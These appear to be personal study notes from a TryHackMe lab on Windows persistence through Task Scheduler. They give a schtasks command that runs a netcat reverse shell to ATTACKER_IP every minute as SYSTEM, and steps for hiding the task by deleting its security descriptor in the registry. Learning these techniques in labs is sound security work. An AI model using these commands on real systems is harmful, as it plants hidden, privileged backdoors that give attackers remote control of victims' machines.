#cybersecurity #windows 

### Task Scheduler
This allows granular control of when the task start
`schtask` to interact with.

Let's create a task that runs a reverse shell every single minute

```cmd
schtasks /create /sc minute /mo 1 /tn THM-TaskBackdoor /tr "c:\tools\nc64 -e cmd.exe ATTACKER_IP 4449" /ru SYSTEM SUCCESS: The scheduled task "THM-TaskBackdoor" has successfully been created
```

`/sc` e `/mo` tells that the task should run every minute
`/ru` to tell the task to run with SYSTEM privileges

To check if a task exists

```cmd
schtasks /query /tn thm-taskbackdoor
```

### Making the task invisible
To hide it we can delete the **Security Descriptor**. It's an ACL that states wich user has access to the task. Deleting it is equivalent to disallowing all user's access.
It's stored in 
`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\`

`c:\tools\pstools\PsExec64.exe -s -i regedit`

The SD is under the SD value of the key of the task
